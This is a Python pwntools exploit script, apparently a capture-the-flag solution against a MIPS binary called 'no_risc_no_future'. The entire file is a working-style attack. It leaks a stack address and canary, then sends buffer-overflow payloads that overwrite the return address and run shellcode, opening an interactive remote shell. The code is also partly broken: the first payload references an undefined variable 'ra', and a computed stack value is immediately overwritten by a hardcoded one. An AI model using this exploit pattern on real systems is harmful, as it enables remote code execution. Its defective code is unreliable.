from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./no_risc_no_future"

# get shell only in remote, due to the stack offset
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(["./qemu-mipsel-static",bin_name]) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

r.send ("A" * 0x1c)
stack = u32 (r.recvline ()[-8:-4])
log.info ("stack: " + hex (stack))

r.send ("A" * 0x41)
canary = u32 ("\x00" + r.recvline ()[-4:-1])
log.info ("canary: " + hex(canary))

context.arch = 'mips'
context.os = 'linux'
bss = elf.bss (0xa00)
log.info ("bss: " + hex (bss))
puts = 0x00408F70 

target = 0x4005f8

payload2 = p32(0x0)
payload2 *= 10 

# shellcraft is god , shellstorms is outdated
payload2 += asm (shellcraft.mips.sh(), arch='mips', os='linux', bits=32, endian='little')
pay = "A"*0x40 + p32(canary) + p32(bss) + p32(ra) + payload2
print len(pay)

for _ in xrange (8):
  r.send(pay.ljust (0x100, "\x00"))
  r.recvline ()


for __ in xrange (2):
  for _ in xrange (10):
    r.send(pay.ljust (0x100, "\x00"))
    r.recvline ()

stack -= 4 

stack = 0x7ffffe68
pay = "A"*0x40 + p32(canary) + p32(bss) + p32(stack+8) + payload2
for _ in xrange (10):
  r.send(pay.ljust (0x100, "\x00"))
  r.recvline ()

r.interactive ()
